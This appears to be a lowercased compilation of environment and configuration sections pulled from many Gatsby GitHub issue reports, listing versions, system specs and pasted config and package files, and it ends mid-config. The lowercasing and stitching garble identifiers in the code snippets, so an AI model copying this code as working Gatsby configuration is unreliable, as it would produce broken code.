system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i5-4278u cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v8.11.3/bin/npm browsers: chrome: 68.0.3440.42 firefox: 61.0 safari: 11.1.1 npmglobalpackages: gatsby-cli: 1.1.52 gatsby-dev-cli: 1.2.12
13" macbook pro
macos sierra v10.12.6
128 resolution
google chrome v67.0.3396.99
```bash system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 8.11.3 - /usr/local/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 5.6.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.99 safari: 11.1.1 npmpackages: gatsby: next => 2.0.0-beta.12 gatsby-plugin-offline: ^2.0.0-beta.2 => 2.0.0-beta.2 npmglobalpackages: gatsby-cli: 1.1.58
``` system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i5-7500 cpu @ 3.40ghz shell: 5.3 - /bin/zsh binaries: node: 8.7.0 - /usr/local/bin/node yarn: 1.5.1 - /usr/local/bin/yarn npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.99 firefox: 60.0.2 safari: 11.1.1 npmpackages: gatsby: next => 2.0.0-beta.9 gatsby-cli: next => 2.0.0-beta.2 gatsby-image: next => 2.0.0-beta.2 gatsby-plugin-favicon: ^2.1.1 => 2.1.1 gatsby-plugin-manifest: next => 2.0.2-beta.2 gatsby-plugin-netlify: next => 2.0.0-beta.2 gatsby-plugin-netlify-cache: ^0.1.0 => 0.1.0 gatsby-plugin-offline: next => 2.0.0-beta.2 gatsby-plugin-react-helmet: next => 3.0.0-beta.2 gatsby-plugin-robots-txt: ^1.0.2 => 1.0.2 gatsby-plugin-sharp: next => 2.0.0-beta.2 gatsby-plugin-sitemap: next => 2.0.0-beta.2 gatsby-plugin-webpack-bundle-analyzer: ^0.1.1 => 0.1.1 gatsby-source-filesystem: next => 2.0.1-beta.3 gatsby-transformer-sharp: next => 2.1.1-beta.2 gatsby-transformer-yaml: next => 2.1.1-beta.2 npmglobalpackages: gatsby-cli: 2.0.0-beta.2
``` system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.5.1 - /usr/local/bin/zsh binaries: node: 8.11.3 - /usr/local/opt/node@8/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 5.6.0 - /usr/local/opt/node@8/bin/npm browsers: chrome: 67.0.3396.87 safari: 11.1.1 npmpackages: gatsby: ^2.0.0-beta.11 => 2.0.0-beta.11 gatsby-image: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-plugin-canonical-urls: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-plugin-react-helmet: ^3.0.0-beta.2 => 3.0.0-beta.2 gatsby-plugin-sharp: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-plugin-styled-components: ^3.0.0-beta.2 => 3.0.0-beta.2 gatsby-plugin-typescript: ^2.0.0-beta.4 => 2.0.0-beta.4 gatsby-remark-copy-linked-files: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-remark-images: ^2.0.1-beta.3 => 2.0.1-beta.3 gatsby-remark-prismjs: ^3.0.0-beta.2 => 3.0.0-beta.2 gatsby-remark-responsive-iframe: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-remark-smartypants: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-source-filesystem: ^2.0.1-beta.3 => 2.0.1-beta.3 gatsby-transformer-json: ^2.1.1-beta.2 => 2.1.1-beta.2 gatsby-transformer-remark: ^2.1.1-beta.2 => 2.1.1-beta.2 gatsby-transformer-sharp: ^2.1.1-beta.2 => 2.1.1-beta.2 npmglobalpackages: gatsby-cli: 1.1.58
``` <!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here
not working? you may need to update your global gatsby-cli - `npm install -g gatsby-cli`
--> ### file contents (if changed) `gatsby-config.js`: [see repo.](
`package.json`: [see repo.](
`gatsby-node.js`: [see repo.](
`gatsby-browser.js`: [see repo.](
`gatsby-ssr.js`: [see repo.](
gatsby version: 2.0.0-beta.2
node version: 8.11.2
npm version: 5.6.0 ### file contents (if changed) i used the [`using-typescript`]( example for this issue.
system: os: macos high sierra 10.13.3 cpu: x64 intel(r) core(tm) i7-6700hq cpu @ 2.60ghz shell: 3.2.57 - /bin/bash binaries: node: 10.0.0 - /usr/local/bin/node yarn: 1.6.0 - ~/.yarn/bin/yarn npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.87 firefox: 57.0.3 safari: 11.0.3 npmpackages: gatsby: next => 2.0.0-beta.1 gatsby-image: ^2.0.0-beta.1 => 2.0.0-beta.1 gatsby-link: ^1.6.44 => 1.6.44 gatsby-plugin-canonical-urls: ^1.0.18 => 1.0.18 gatsby-plugin-feed: ^1.3.22 => 1.3.25 gatsby-plugin-google-analytics: ^1.0.31 => 1.0.31 gatsby-plugin-manifest: ^1.0.22 => 1.0.27 gatsby-plugin-netlify: ^1.0.19 => 1.0.21 gatsby-plugin-nprogress: ^1.0.14 => 1.0.14 gatsby-plugin-offline: ^1.0.16 => 1.0.18 gatsby-plugin-react-helmet: ^2.0.11 => 2.0.11 gatsby-plugin-sitemap: ^1.2.23 => 1.2.25 gatsby-plugin-styled-components: ^2.0.11 => 2.0.11 gatsby-plugin-svgr: ^1.0.1 => 1.0.1 gatsby-plugin-typography: ^1.7.19 => 1.7.19 gatsby-remark-prismjs: ^2.0.2 => 2.0.4 gatsby-source-contentful: next => 2.0.1-beta.1 gatsby-source-filesystem: ^1.5.36 => 1.5.39 gatsby-transformer-remark: ^1.7.41 => 1.7.44 gatsby-transformer-sharp: ^2.1.1-beta.1 => 2.1.1-beta.1 npmglobalpackages: gatsby-cli: 1.1.58 ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: linux 4.13 ubuntu 17.10 (artful aardvark) cpu: x64 amd a10-6700 apu with radeon(tm) hd graphics shell: 5.2 - /usr/bin/zsh binaries: node: 9.10.1 - /usr/local/bin/node yarn: 1.6.0 - /usr/local/bin/yarn npm: 5.8.0 - /usr/local/bin/npm browsers: chrome: 65.0.3325.162 firefox: 60.0.2 npmpackages: gatsby: next => 2.0.0-beta.9 gatsby-plugin-react-helmet: next => 3.0.0-beta.2 gatsby-plugin-sharp: next => 2.0.0-beta.2 gatsby-plugin-typography: next => 2.2.0-beta.2 gatsby-remark-component: ^1.1.3 => 1.1.3 gatsby-remark-copy-linked-files: next => 2.0.0-beta.2 gatsby-remark-emojis: ^0.2.3 => 0.2.3 gatsby-remark-generic-extensions: ^0.0.1 => 0.0.1 gatsby-remark-images: next => 2.0.1-beta.3 gatsby-remark-smartypants: ^1.4.12 => 1.4.12 gatsby-source-filesystem: next => 2.0.1-beta.3 gatsby-transformer-remark: next => 2.1.1-beta.2 ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
this is from my own site directory.
``` system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i5-4670 cpu @ 3.40ghz shell: 5.3 - /bin/zsh binaries: node: 8.11.1 - /usr/local/bin/node yarn: 1.6.0 - /usr/local/bin/yarn npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.87 firefox: 60.0.1 safari: 11.1.1 npmpackages: gatsby: ^2.0.0-beta.9 => 2.0.0-beta.9 gatsby-plugin-glamor: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-plugin-manifest: ^2.0.2-beta.2 => 2.0.2-beta.2 gatsby-plugin-netlify: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-plugin-offline: ^2.0.0-beta.2 => 2.0.0-beta.2 gatsby-plugin-react-helmet: ^3.0.0-beta.2 => 3.0.0-beta.2 gatsby-plugin-sitemap: ^2.0.0-beta.2 => 2.0.0-beta.2 npmglobalpackages: gatsby-cli: 2.0.0-beta.1
``` ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
latest gatsby, windows 10 64-bit, ide: webstorm
system: os: windows 10 cpu: x64 amd ryzen 7 1800x eight-core processor binaries: npm: 5.8.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: next => 2.0.0-beta.5 gatsby-plugin-react-helmet: next => 3.0.0-beta.2 gatsby-source-filesystem: next => 2.0.1-beta.3 gatsby-transformer-json: next => 2.1.1-beta.2 ### file contents (if changed)
see [repo](
macos, node v9.11.1, npm v6.1.0, yarn v1.7.0 system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 3.2.57 - /bin/bash binaries: node: 9.11.1 - ~/.nvm/versions/node/v9.11.1/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 6.1.0 - ~/.nvm/versions/node/v9.11.1/bin/npm browsers: chrome: 67.0.3396.87 firefox: 60.0.1 safari: 11.1.1 npmpackages: gatsby: next => 2.0.0-beta.2 gatsby-image: next => 2.0.0-beta.1 gatsby-plugin-emotion: next => 2.0.0-beta.1 gatsby-plugin-manifest: next => 2.0.2-beta.1 gatsby-plugin-netlify: next => 2.0.0-beta.1 gatsby-plugin-netlify-cms: next => 2.0.0-beta.1 gatsby-plugin-offline: next => 2.0.0-beta.1 gatsby-plugin-react-helmet: next => 3.0.0-beta.1 gatsby-plugin-sharp: next => 2.0.0-beta.1 gatsby-source-filesystem: next => 2.0.1-beta.1 gatsby-transformer-remark: next => 2.1.1-beta.1 gatsby-transformer-sharp: next => 2.1.1-beta.1 gatsby-transformer-yaml: next => 2.1.1-beta.1 npmglobalpackages: gatsby: 2.0.0-beta.1 ### file contents (if changed) `gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
$ ./node_modules/.bin/gatsby info --clipboard system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 3.2.57 - /bin/bash binaries: node: 8.9.4 - /usr/local/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 5.6.0 - /usr/local/bin/npm browsers: chrome: 67.0.3396.87 firefox: 60.0.1 safari: 11.1.1 npmpackages: gatsby: ^2.0.0-beta.1 => 2.0.0-beta.1 gatsby-cli: ^1.1.58 => 1.1.58 gatsby-plugin-google-analytics: ^1.0.20-10 => 1.0.20-10 gatsby-plugin-react-helmet: ^2.0.12-7 => 2.0.12-7 gatsby-plugin-sitemap: ^1.2.14-10 => 1.2.14-10 gatsby-plugin-typography: ^2.0.1-11 => 2.0.1-11
``` ### file contents (if changed)
`gatsby-config.js`: n/a
`package.json`
$ git diff package.json
diff --git a/package.json b/package.json
index efa965a..ca4a395 100644
--- a/package.json
+++ b/package.json
@@ -31,12 +31,12 @@ "enzyme-adapter-react-16": "^1.1.1", "eslint": "^4.19.1", "eslint-plugin-react": "^7.7.0",
- "gatsby": "next",
+ "gatsby": "^2.0.0-beta.1", "gatsby-cli": "^1.1.58",
- "gatsby-plugin-google-analytics": "next",
- "gatsby-plugin-react-helmet": "next",
- "gatsby-plugin-sitemap": "next",
- "gatsby-plugin-typography": "next",
+ "gatsby-plugin-google-analytics": "^1.0.20-10",
+ "gatsby-plugin-react-helmet": "^2.0.12-7",
+ "gatsby-plugin-sitemap": "^1.2.14-10",
+ "gatsby-plugin-typography": "^2.0.1-11", "glob": "^7.1.2", "jest": "^22.4.3", "prop-types": "^15.6.1",
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
* gatsby version (`npm list gatsby`): gatsby@1.9.215
* gatsby-cli version (`gatsby --version`): 1.1.52
* node.js version: v9.11.1
* operating system: macos 10.13.4 (17e202) (high sierra) ### file contents (if changed)
`gatsby-config.js`:
`package.json`:
`gatsby-node.js`:
* gatsby version (1.9.264):
* gatsby-cli version (1.1.52):
* node.js version: v8.9.4
* operating system: mac os x ### file contents (if changed)
`gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
* gatsby version (`npm list gatsby`): 1.9.261
* gatsby-cli version (`gatsby --version`): 1.1.52
* node.js version: 9.4.0
* operating system: macos high sierra
* gatsby version (`npm list gatsby`): v1 & v2
* operating system: os x
* gatsby version (`npm list gatsby`): gatsby@1.9.250
* gatsby-cli version (`gatsby --version`): 1.1.52
* node.js version: v8.11.1
* operating system: antergos linux ### file contents (if changed)
`gatsby-config.js`: n/a
`package.json`: added `styled-components ^3.2.6`
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
* gatsby version (`npm list gatsby`):
gatsby@1.9.260
* gatsby-cli version (`gatsby --version`):
* node.js version:
* operating system:
$ lsb_release -a
lsb version: :core-4.1-amd64:core-4.1-noarch
distributor id: centos
description: centos linux release 7.5.1804 (core) release: 7.5.1804
codename: core
``` ### file contents (if changed)
not applicable so not filling out, but i can
`gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
* gatsby version (`npm list gatsby`): 1.9.250
* gatsby-cli version (`gatsby --version`): 1.1.52
* node.js version: v8.11.1
* operating system: macos ### file contents (if changed)
see: for example and reproduction.
* gatsby version (`npm list gatsby`): 2.0.0-alpha.39
* gatsby-cli version (`gatsby --version`): 2.0.0-alpha.39
* node.js version: 8.11.2
* operating system: windows 10 x64 ### file contents (if changed) please see the [related git repository](
* gatsby version (`npm list gatsby`):
* gatsby-cli version (`gatsby --version`):
* node.js version: * operating system: ### file contents (if changed)
`gatsby-config.js`: n/a
`package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
* gatsby version (`npm list gatsby`): 2.0.0-alpha.32
* gatsby-cli version (`gatsby --version`): 2.0.0-alpha.32
* node.js version: 8.11.1
* operating system: windows 10 x64 ### file contents (if changed) `gatsby-config.js`: ```js
module.exports = { plugins: ['gatsby-plugin-sass'],
}; ``` **note:** gatsby-plugin-react-helmet doesn't even need to be added to `plugins` in order to reproduce the bug
`package.json`: ```json
{ "private": true, "scripts": { "build": "gatsby build", "develop": "gatsby develop" }, "dependencies": { "gatsby": "^2.0.0-alpha.32", "gatsby-plugin-react-helmet": "^2.0.12-3", "gatsby-plugin-sass": "^2.0.0-alpha.11", "prop-types": "^15.6.1", "react": "^16.3.2", "react-dom": "^16.3.2", "react-helmet": "^5.2.0" }
``` **note:** without gatsby-plugin-react-helmet, `gatsby develop` works fine.
* gatsby version (`npm list gatsby`): next
* gatsby-cli version (`gatsby --version`): next
* node.js version: 8.11.1 (lts/carbon)
* operating system: macos 10.13.4 ### file contents see
* gatsby version ^1.9.259
* gatsby remark prism version ^2.0.2
* node.js version: 9.3.0
* operating system: osx 10.11.6
* gatsby version (`npm list gatsby`): 1.9.259
* gatsby-cli version (`gatsby --version`): 1.9.259
* node.js version: 9.4.0
* operating system: macos high sierra 10.13.4 ### file contents only including relevant details
`package.json`: ```json
{ "dependencies": { "gatsby": "^1.9.259", "gatsby-link": "^1.6.40", "gatsby-plugin-canonical-urls": "^1.0.18", "gatsby-plugin-google-analytics": "^1.0.29", "gatsby-plugin-manifest": "^1.0.20", "gatsby-plugin-nprogress": "^1.0.14", "gatsby-plugin-react-helmet": "^2.0.10", "gatsby-plugin-react-next": "^1.0.11", "gatsby-plugin-remove-trailing-slashes": "^1.0.9", "gatsby-plugin-robots-txt": "^1.0.1", "gatsby-plugin-sentry": "^0.0.4", "gatsby-plugin-sharp": "^1.6.42", "gatsby-plugin-sitemap": "^1.2.22", "gatsby-plugin-typescript": "^1.4.19", "gatsby-remark-images": "^1.5.61", "gatsby-source-filesystem": "^1.5.31", "gatsby-transformer-json": "^1.0.17", "gatsby-transformer-remark": "^1.7.39", }
* gatsby version (`npm list gatsby`): gatsby@1.9.255
* gatsby-cli version (`gatsby --version`): 1.1.51
* node.js version: 6.0.0
* operating system: win10
* gatsby version (`npm list gatsby`): gatsby@1.9.223
* gatsby-cli version (`gatsby --version`): 1.1.49
* node.js version: v9.8.0
* operating system: macos 10.13.4 ### file contents (if changed): `gatsby-config.js`: ```js
module.exports = { plugins: [ 'gatsby-plugin-react-helmet', 'gatsby-plugin-twitter', 'gatsby-plugin-instagram', 'gatsby-plugin-five-stages', 'gatsby-plugin-amplitude', 'gatsby-plugin-catch-links', 'gatsby-transformer-sharp', { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/src`, name: 'src', }, }, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/posts`, name: 'posts', }, }, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/offers`, name: 'offers', }, }, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/pages`, name: 'pages', }, }, { resolve: 'gatsby-transformer-remark', options: { plugins: [ { resolve: 'gatsby-remark-images', options: { maxwidth: 1380, linkimagestooriginal: false, }, }, { resolve: 'gatsby-remark-responsive-iframe', }, 'gatsby-remark-copy-linked-files', 'gatsby-remark-numbered-footnotes', 'gatsby-remark-smartypants', ], }, }, ],
}; ``` `package.json`: ```json
{ "name": "lengstorf", "version": "0.0.0-semantic-release", "license": "mit", "scripts": { "develop": "gatsby develop", "build": "gatsby build", "serve": "gatsby serve", "lint:js": "eslint src", "lint:css": "stylelint \\"src/**/*.css\\"", "lint": "yarn lint:js && yarn lint:css" }, "dependencies": { "gatsby": "^1.9.102", "gatsby-image": "^1.0.24", "gatsby-link": "^1.6.22", "gatsby-plugin-catch-links": "^1.0.9", "gatsby-plugin-manifest": "^1.0.8", "gatsby-plugin-offline": "^1.0.10", "gatsby-plugin-react-css-modules": "^1.0.9", "gatsby-plugin-react-helmet": "^2.0.1", "gatsby-plugin-sharp": "^1.6.21", "gatsby-plugin-twitter": "^1.0.13", "gatsby-remark-copy-linked-files": "^1.5.21", "gatsby-remark-images": "^1.5.32", "gatsby-remark-responsive-iframe": "^1.4.14", "gatsby-remark-smartypants": "^1.4.8", "gatsby-source-filesystem": "^1.5.8", "gatsby-transformer-remark": "^1.7.21", "gatsby-transformer-sharp": "^1.6.14", "lodash": "^4.17.4", "lodash-webpack-plugin": "^0.11.4", "lodash.template": "^4.4.0", "prop-types": "^15.6.0", "react": "^16.1.0", "react-dom": "^16.1.0", "react-helmet": "^5.2.0", "react-transition-group": "^2.2.1", "remark-numbered-footnotes": "^1.0.1", "retext": "^5.0.0", "whatwg-fetch": "^2.0.3" }, "devdependencies": { "jl-toolbox": "^0.9.2", "remark-cli": "^4.0.0", "remark-preset-lint-recommended": "^3.0.1", "stylelint": "^8.2.0", "stylelint-config-standard": "^18.0.0", "webpack-bundle-analyzer": "^2.9.1" }
- gatsby version: 1.9.248
- operating system: macos 10.12.6
- browser: safari 11.1
* gatsby version: 1.9.253
* gatsby-cli version: 1.1.51
* node.js version: 6.11.0
* operating system: mac os 10.11.6
* gatsby version (`npm list gatsby`): 1.9.250
* gatsby-cli version (`gatsby --version`): 1.1.50
* node.js version: v9.11.1
* operating system: ubuntu 16 ### file contents (if changed): `gatsby-config.js`: not changed
`package.json`: not changed
`gatsby-node.js`: not changed
`gatsby-browser.js`: not changed
`gatsby-ssr.js`: not changed
* gatsby version `1.9.253`:
* gatsby-cli version `1.1.50`:
* node.js version: `v8.9.4`
* operating system: windows 10 ### file contents (if changed): `gatsby-config.js`: ```
require('dotenv').config(); module.exports = { sitemetadata: { title: `tootle's pumpkin inn`, }, plugins: [ `gatsby-plugin-react-helmet`, `gatsby-plugin-glamor`, `gatsby-transformer-remark`, 'gatsby-plugin-sass', { resolve: `gatsby-source-contentful`, options: { spaceid: process.env.contentful_space_id, accesstoken: process.env.contentful_access_token } }, { resolve: 'gatsby-source-filesystem', options: { name: 'src', path: `${__dirname}/src/` }, }, { resolve: `gatsby-plugin-typography`, options: { pathtoconfigmodule: `src/utils/typography`, }, }],
`package.json`: ```
{ "name": "gatsby-starter-default", "description": "gatsby default starter", "version": "1.0.0", "author": "kyle mathews <mathews.kyle@gmail.com>", "dependencies": { "bootstrap": "^4.1.0", "dot-env": "0.0.1", "gatsby": "^1.9.253", "gatsby-image": "^1.0.47", "gatsby-link": "^1.6.41", "gatsby-paginate": "^1.0.14", "gatsby-plugin-glamor": "^1.6.13", "gatsby-plugin-react-helmet": "^2.0.11", "gatsby-plugin-sass": "1.0.19", "gatsby-plugin-typography": "^1.7.18", "gatsby-source-contentful": "^1.3.47", "gatsby-source-filesystem": "^1.5.32", "gatsby-transformer-remark": "^1.7.40", "gatsby-transformer-sharp": "^1.6.23", "react-fontawesome": "^1.6.1", "react-helmet": "^5.2.0", "react-transition-group": "^2.3.1", "reactstrap": "^5.0.0", "typeface-lobster": "0.0.54", "typography-theme-kirkham": "^0.16.3" }, "keywords": [ "gatsby" ], "license": "mit", "main": "n/a", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "format": "prettier --trailing-comma es5 --no-semi --single-quote --write \\"src/**/*.js\\"", "test": "echo \\"error: no test specified\\" && exit 1" }, "devdependencies": { "prettier": "^1.12.1" }
`gatsby-node.js`:
`gatsby-browser.js`:
`gatsby-ssr.js`:
please check here
* gatsby version (`npm list gatsby`): 1.9.250
* gatsby-cli version (`gatsby --version`): 1.1.50
* node.js version: 9.10.1.
* operating system: mac os 10.12.6 ### file contents (if changed): see diff between `a13b5b8d` and `0b26e909`.
* gatsby version (`npm list gatsby`): 1.9.253
* gatsby-cli version (`gatsby --version`): 1.9.250
* node.js version: 8
* operating system: macos
i wish i had written down more details about their computer specs
don't have these
* gatsby version (`npm list gatsby`):
* gatsby-cli version (`gatsby --version`):
* node.js version:
* operating system:
* gatsby version (`npm list gatsby`): `gatsby@1.9.243`
* gatsby-cli version (`gatsby --version`): not installed (i use `package.json` commands)
* node.js version: v8.9.4
* operating system: os x 10.13.3 ### file contents (if changed): (i'll provide an example project which reproduces this if needed.)
* gatsby version (`npm list gatsby`): `npm err! missing: gatsby@1.9.241, required by gatsby-starter-default@1.0.0` (but running `yarn develop` works just fine)
* gatsby-cli version (`gatsby --version`): 1.9.223 (globally installed)
* node.js version: v9.5.0
* operating system: os x 10.12.6 ### file contents (if changed): `gatsby-node.js`: ``` // you can delete this file if you're not using it
const crypto = require(`crypto`) exports.sourcenodes = ({ boundactioncreators }) => { const { createnode } = boundactioncreators // create nodes here
const row = {}; row.nowhitespace = "ok"; row[\'has whitespace\'] = "ok"; const gatsbynode = object.assign({ // required gatsby fields id: `problemnode1`, parent: "__source__", children: [], internal: { type: `problemnode`, contentdigest: crypto .createhash("md5") .update(json.stringify(row)) .digest("hex") } }, row); createnode(gatsbynode);
``` `src/psges/index.js`: ```
import react from 'react'
import link from 'gatsby-link' const indexpage = ({ data,
}) => ( <div> <pre>{json.stringify(data, null, 2)}</pre> </div>
) export default indexpage export const pagequery = graphql` query gatsby4751 { allproblemnode { edges { node { nowhitespace has_whitespace } } } }
``` output: ```
{ "allproblemnode": { "edges": [ { "node": { "nowhitespace": "ok", "has_whitespace": null } } ] }
* gatsby version (`npm list gatsby`): gatsby@1.9.232
* gatsby-cli version (`gatsby --version`): 1.1.41
* node.js version: v8.9.4
* operating system: ubuntu 16.04 x64 ### file contents (if changed): `gatsby-config.js`: nothing special other than contentful source active
`package.json`: nothing special
`gatsby-node.js`: nothing special
`gatsby-browser.js`: not changed
`gatsby-ssr.js`: not changed
gatsby version: 1.1.40
node.js version: 8.9.4
operating system: linux mint 18.3 ### file contents (if changed): `gatsby-config.js`:
module.exports = { sitemetadata: { title: 'gatsby default starter', }, plugins: [ 'gatsby-plugin-react-helmet', { resolve: `gatsby-source-wordpress`, options: { /* * the base url of the wordpress site without the trailingslash and the protocol
this is required
* example : 'gatsbyjswpexample.wordpress.com' or 'www.example-site.com' */ baseurl: `sitewithlongnames.com`, // the protocol
this can be http or https
protocol: `http`, // indicates whether the site is hosted on wordpress.com
// if false, then the asumption is made that the site is self hosted
// if true, then the plugin will source its content on wordpress.com using the json rest api v2
// if your site is hosted on wordpress.org, then set this to false
hostingwpcom: false, // if useacf is true, then the source plugin will try to import the wordpress acf plugin contents
// this feature is untested for sites hosted on wordpress.com useacf: false, verboseoutput: true, }, }, 'gatsby-plugin-netlify', // make sure to put last in the array ],
`package.json`:
"dependencies": { "gatsby": "^1.9.188", "gatsby-image": "^1.0.35", "gatsby-link": "^1.6.34", "gatsby-plugin-netlify": "^1.0.18", "gatsby-plugin-react-helmet": "^2.0.3", "gatsby-source-wordpress": "^2.0.54", "react-helmet": "^5.2.0" },
``` `gatsby-node.js`: ```
const _ = require(`lodash`)
const path = require(`path`)
const promise = require(`bluebird`)
const slash = require(`slash`) // implement the gatsby api reatepages
// called after the gatsby bootstrap is finished so you have
// access to any information necessary to programmatically
// create pages.
// will create pages for wordpress pages (route : /{slug})
// will create pages for wordpress posts (route : /post/{slug})
exports.createpages = ({ graphql, boundactioncreators }) => { const { createpage } = boundactioncreators return new promise((resolve, reject) => { // the raphql function allows us to run arbitrary // queries against the local wordpress graphql schema
think of // it like the site has a built-in database constructed // from the fetched data that you can run queries against
// ==== pages (wordpress native) ==== graphql( ` { allwordpresspage { edges { node { id slug status template } } } } ` ) .then(result => { if (result.errors) { console.log(result.errors) reject(result.errors) } // create page pages
const pagetemplate = path.resolve(`./src/templates/page.js`) // we want to create a detailed page for each // page node
we'll just use the wordpress slug for the slug
// the page id is prefixed with 'page_' _.each(result.data.allwordpresspage.edges, edge => { // gatsby uses redux to manage its internal state
// plugins and sites can use functions like "createpage" // to interact with gatsby
createpage({ // each page is required to have a `path` as well // as a template component
the `context` is // optional but is often necessary so the template // can query data specific to each page
path: `/${edge.node.slug}/`, component: slash(pagetemplate), context: { id: edge.node.id, }, }) }) }) // ==== end pages ==== // ==== posts (wordpress native and acf) ==== .then(() => { graphql( ` { allwordpresspost { edges { node { id slug status template format } } } } ` ).then(result => { if (result.errors) { console.log(result.errors) reject(result.errors) } const posttemplate = path.resolve(`./src/templates/post.js`) // we want to create a detailed page for each // post node
we'll just use the wordpress slug for the slug
// the post id is prefixed with 'post_' _.each(result.data.allwordpresspost.edges, edge => { createpage({ path: edge.node.slug, component: slash(posttemplate), context: { id: edge.node.id, }, }) }) resolve() }) }) // ==== end posts ==== })
gatsby version: 1.9.158
node.js version: 8.9.3
operating system: macos x ### file contents (if changed): `gatsby-config.js`: resolve: `gatsby-transformer-remark`, `package.json`: "dependencies": { "gatsby": "^1.9.158", "gatsby-link": "^1.6.34", "gatsby-plugin-canonical-urls": "^1.0.12", "gatsby-plugin-react-helmet": "^2.0.3", "gatsby-plugin-sharp": "^1.6.27", "gatsby-remark-images": "^1.5.43", "gatsby-remark-prismjs": "^1.2.15", "gatsby-source-filesystem": "^1.5.16", "gatsby-transformer-remark": "^1.7.30", ...
} `gatsby-node.js`:
`gatsby-browser.js`:
`gatsby-ssr.js`:
gatsby version: 1.9.190
node.js version: 8.9
operating system: macos 10.12.6 and whatever version of debian netlify is using on their docker container
gatsby version: 1.9.158 and all my packages/plugins are up to date
node.js version: v8.9.4 (npm v5.6.0) ### file contents (if changed): `gatsby-config.js`: <details> ```
const sitemetadata = require(\'./src/data/site-metadata\') module.exports = { sitemetadata, mapping: { \'markdownremark.frontmatter.author\': `authoryaml`, }, plugins: [ { resolve: `gatsby-source-filesystem`, options: { name: `images`, path: `${__dirname}/src/images`, }, }, { resolve: \'gatsby-source-filesystem\', options: { name: \'pages\', path: `${__dirname}/src/pages`, }, }, { resolve: `gatsby-plugin-typography`, options: { pathtoconfigmodule: `src/utils/typography`, }, }, { resolve: `gatsby-plugin-canonical-urls`, options: { siteurl: sitemetadata.siteurl, }, }, `gatsby-transformer-sharp`, `gatsby-transformer-documentationjs`, `gatsby-transformer-yaml`, { resolve: `gatsby-transformer-remark`, options: { plugins: [ { resolve: `gatsby-remark-images`, options: { maxwidth: 786, backgroundcolor: `#ffffff`, }, }, { resolve: `gatsby-remark-responsive-iframe`, options: { wrapperstyle: `margin-bottom: 1.05rem`, }, }, `gatsby-remark-prismjs`, `gatsby-remark-copy-linked-files`, `gatsby-remark-smartypants`, `gatsby-remark-autolink-headers`, ], }, }, { resolve: `gatsby-plugin-nprogress`, options: { color: `#9d7cbf`, showspinner: false, }, }, `gatsby-plugin-glamor`, `gatsby-plugin-sharp`, `gatsby-plugin-catch-links`, `gatsby-plugin-react-next`, `gatsby-plugin-lodash`, { resolve: `gatsby-plugin-manifest`, options: { name: `imagine clarity`, short_name: `imagine clarity`, start_url: `/`, background_color: `#f7f0eb`, theme_color: `#5c2965`, display: `minimal-ui`, icons: [ { src: `/android-chrome-192x192.png`, sizes: `192x192`, type: `image/png`, }, { src: `/android-chrome-512x512.png`, sizes: `512x512`, type: `image/png`, }, ], }, }, { resolve: `gatsby-plugin-offline`, options: { navigatefallback: null, navigatefallbackwhitelist: [], }, }, `gatsby-transformer-csv`, { resolve: `gatsby-plugin-intercom-spa`, options: { app_id: process.env.intercom_app_id, }, }, `gatsby-plugin-twitter`, `gatsby-plugin-react-helmet`, { resolve: \'gatsby-plugin-i18n\', options: { langkeyfornull: \'any\', langkeydefault: 